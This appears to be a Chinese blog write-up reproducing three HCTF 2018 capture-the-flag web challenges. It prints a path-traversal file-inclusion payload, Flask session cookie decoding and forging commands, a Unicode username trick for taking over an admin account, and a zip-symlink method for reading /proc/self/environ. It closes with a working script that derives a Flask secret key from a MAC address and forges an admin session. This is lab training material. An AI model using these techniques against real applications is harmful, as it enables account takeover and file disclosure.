+++
title = "HCTF2018"
slug = "hctf2018"
description = "刷"
date = "2024-08-12T21:12:16"
lastmod = "2024-08-12T21:12:16"
image = ""
license = ""
categories = ["复现"]
tags = ["session"]
+++

# [HCTF 2018]WarmUp

查看源码`/source.php`

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>

```

`/hint.php`

**flag not here, and flag in ffffllllaaaagggg**

```
?file=hint.php?/../../../../ffffllllaaaagggg
```

# [HCTF 2018]admin

一个代码审计

## 爆破

得到密码`123`

```
username:admin

password:123
```

# session

key在源码中为`ckj123`

```
python flask_session_cookie_manager3.py decode -c .eJxFkE9rwkAUxL9KeWcP-aMXwUNko6TwdllYm769SGpikpesBdMSs-J3bxDaHgYGBn7DzB2O52s1NLA-F_1QLeDYlrC-w8sHrIGiNMZIj5hTqPa2R3OayGexym1HnI7ItiWTTigyr8y2t7Mkb1sUeoW-HsnXsRKHEM2usU6vpKERTRIQ0826NFCiZLl_ZeJshZFlKcjbnG7S6KUVkimfu7lha3atzK2TopvQzd5kgXSHYGaFZLYNetzAYwGn4Xo-fn121eV_gpOtMhQpkXhyuw7zw5I4mXCvQ-KSLb_1SmhvXTbXlr3lJMZ688S1rqirP5J-J_-bXAo3B1CUrr3AAr6H6vr8DcIAHj_G823f.ZroR4g.PEBG6nflA7LhBDqpyDNubGEEHQs -s ckj123
```

```
python3 flask_session_cookie_manager3.py encode -t "{'_fresh': False, '_id': b'ca73d01f58fe172c279fdb1026ba1202390ee0e60b049380c8785511afd9560104b61fa487c4bcb293fc463ef1548d3cad028ce1b5ff4922ab5246e4105a0a33', 'csrf_token': b'bcb966803bad1e8b020d5b7cf5e843fb157ef072', 'image': b'Av32', 'name': 'admin', 'user_id': '10'}" -s ckj123
```

然后把session改了

## unicode

- 注册用户ᴬdmin
- 登录用户ᴬdmin，变成Admin
- 修改密码Admin，更改了admin的密码

特殊绕过了算

对于一些特殊字符，nodeprep.prepare会进行如下操作

```
ᴬ -> A -> a
```

## 覆盖admin

这个也算是我的思考吧,毕竟123直接进了,所以应该不是很难,然后我一想,能不能注册的时候覆盖,当时结果没有覆盖成功

# [HCTF 2018]Hideandseek

buu环境503了,思路是这样子

## 软链接

``` 
ln -s 原文件 目标文件

zip -y env.zip env
压缩软链接
```

完成命令之后,会创建目标文件指向原文件

```
root@dkcjbRCL8kgaNGz:/var/www/html# ln -s 1.php 2.png
root@dkcjbRCL8kgaNGz:/var/www/html# ls
1.php  2.png  index.html  script.php
root@dkcjbRCL8kgaNGz:/var/www/html# cat 2.png
<?php
if (isset($_GET['t'])) {
    echo preg_replace('/test/e', $_GET['t'], 'Just test');
}
```

题目环境中

```
username:admin
password:123
```

登录之后上传zip文件发现会回显文件解压之后的内容,使用软连接,读取文件

读取

```
/proc/self/environ     得到环境变量

/app/uwsgi.ini         发现了ini

找到 /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini文件
读取之后发现
[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app

/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py
读取源码
```

```python
# -*- coding: utf-8 -*-
from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
import uuid
import base64
import random
import flag
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(['zip'])

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET'])
def index():
    error = request.args.get('error', '')
    if(error == '1'):
        session.pop('username', None)
        return render_template('index.html', forbidden=1)

    if 'username' in session:
        return render_template('index.html', user=session['username'], flag=flag.flag)
    else:
        return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    username=request.form['username']
    password=request.form['password']
    if request.method == 'POST' and username != '' and password != '':
        if(username == 'admin'):
            return redirect(url_for('index',error=1))
        session['username'] = username
    return redirect(url_for('index'))


@app.route('/logout', methods=['GET'])
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'the_file' not in request.files:
        return redirect(url_for('index'))
    file = request.files['the_file']
    if file.filename == '':
        return redirect(url_for('index'))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a zipfile'


    try:
        extract_path = file_save_path + '_'
        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
        read_obj = os.popen('cat ' + extract_path + '/*')
        file = read_obj.read()
        read_obj.close()
        os.system('rm -rf ' + extract_path)
    except Exception as e:
        file = None

    os.remove(file_save_path)
    if(file != None):
        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
            return redirect(url_for('index', error=1))
    return Response(file)


if __name__ == '__main__':
    #app.run(debug=True)
    app.run(host='127.0.0.1', debug=True, port=10008)
```

## session伪造

是由`random.seed(uuid.getnode())`生成种子,可以根据`mac`地址爆破

```
/sys/class/net/eth0/address      读取地址
```

然后我们需要把`mac`地址转换为10进制

```流程
获取mac地址->转换为16进制->转换为10进制
```

```Java
import java.util.Scanner;

public class MacAddressConverter {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.print("请输入Mac地址：");
        String macAddress = scanner.nextLine();

        long hexAddress = Long.parseLong(macAddress.replace(":", ""), 16);
        long decimalAddress = hexAddress;

        System.out.println("Mac地址的十进制表示为：" + decimalAddress);
    }
}
```

然后爆破`secret_key`

```python
import random
random.seed(2485410381631)
print(str(random.random()*100))
```

最终脚本

```python
import uuid
import random
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

mac = "02:42:ae:00:bf:3f"
temp = mac.split(':')
temp = [int(i,16) for i in temp]
temp = [bin(i).replace('0b','').zfill(8) for i in temp]
temp = ''.join(temp)
mac = int(temp,2)
print(mac)

random.seed(mac)
randnum = str(random.random()*100)
print(randnum)

app = Flask(__name__)
app.config['SECRET_KEY'] = str(randnum)
payload = {'username': 'admin'}
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
session = serializer.dumps(payload)
print(session)
```

这里的`python`脚本转地址是多走了两步骤`(16->2->10)`,但是不影响
